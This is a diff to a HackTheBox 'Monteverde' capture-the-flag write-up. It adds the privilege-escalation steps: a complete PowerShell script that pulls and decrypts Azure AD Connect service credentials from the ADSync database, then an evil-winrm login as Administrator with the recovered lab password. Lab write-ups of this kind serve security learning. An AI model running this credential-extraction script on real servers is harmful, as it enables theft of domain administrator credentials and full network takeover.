@@ -624,6 +624,7 @@ SMB         10.10.10.172    445    MONTEVERDE       users$          READ
 ## Password spray with the password just found
 
 - Using crackmapexec again we find out that this is mhope password
+
 ![mhope](../.res/2022-10-16-14-55-45.png)
 - So we have another pair of credentials `mhope:4n0therD4y@n0th3r$`
 
@@ -634,4 +635,62 @@ SMB         10.10.10.172    445    MONTEVERDE       users$          READ
 
 ## Privesc
 
-**Coming Soon**
+- There are a some folders and programs related to Azure. Our user is a member of the Azure Admins group.  
+
+![Azure admins](../.res/2022-10-17-15-41-05.png)
+- [This blog](https://blog.xpnsec.com/azuread-connect-for-redteam/) has an interesting script to use Microsoft Azure Active Directory Connect
+- I can take the script and upload it using `upload script.ps1` this will fetch the creds from the db ( I hope so :D )
+- We had to change the connection String 0xdf explains it on their writeup [here](https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html)
+
+```powershell
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
+$client.Open()
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$config = $reader.GetString(0)
+$crypted = $reader.GetString(1)
+$reader.Close()
+
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
+
+Write-Host ("Domain: " + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+```
+
+- And it works. We get creds for the administrator `administrator:d0m@in4dminyeah!`  
+
+![Admin creds](../.res/2022-10-17-15-50-52.png)
+
+- Now let's try to connect as Administrator using evil-winrm `evil-winrm -i 10.10.10.172 -u Administrator -p 'd0m@in4dminyeah!'`
+- It works we can grab the root flag  
+
+![root](../.res/2022-10-17-15-54-40.png)
+
+## Resources
+
+- [This writeup of the same box by 0xdf is pretty cool](https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html)
+- [As usual payload all the things has great content. Check out this page about Azure AD Connect](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md#azure-ad-connect---msol-accounts-password-and-dcsync)
